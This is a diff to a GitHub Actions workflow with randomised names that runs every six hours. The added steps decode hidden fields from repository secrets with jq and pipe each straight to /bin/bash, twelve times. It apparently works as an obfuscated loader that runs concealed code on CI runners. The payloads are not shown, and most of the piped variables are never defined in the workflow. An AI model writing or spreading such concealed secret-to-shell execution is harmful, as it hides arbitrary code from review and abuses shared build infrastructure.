@@ -1,23 +1,27 @@
 name: caozhang19870101
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 4/6 * * *'
+    - cron: '54 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caozhang19870101
         env:
-          xwb842: ${{ secrets.xwb842 }}
+          l7805: ${{ secrets.l7805 }}
         run: |
-          echo $xwb842 | jq -r .yeray97128 | /bin/bash
-          echo $n64 | jq -r .mhf16 | /bin/bash
-          echo $nyloe55 | jq -r .rin848 | /bin/bash
-          echo $nmbnr01962 | jq -r .vna01541 | /bin/bash
-          echo $pr90715 | jq -r .wn74 | /bin/bash
-          echo $az9 | jq -r .aqaw29773 | /bin/bash
+          echo $l7805 | jq -r .ouauw801 | /bin/bash
+          echo $u9820 | jq -r .n9489 | /bin/bash
+          echo $krawy7 | jq -r .lszq99274 | /bin/bash
+          echo $gj3 | jq -r .i6227 | /bin/bash
+          echo $niuha080 | jq -r .dvsdo40 | /bin/bash
+          echo $tykwo01 | jq -r .fhdun51 | /bin/bash
+          echo $hb428 | jq -r .og5 | /bin/bash
+          echo $sea9781 | jq -r .w771 | /bin/bash
+          echo $jgsq5 | jq -r .zlc20964 | /bin/bash
+          echo $phhgg37099 | jq -r .zrc14576 | /bin/bash
+          echo $azn49377 | jq -r .qdnpp61912 | /bin/bash
+          echo $vwg55843 | jq -r .pscso8842 | /bin/bash
 
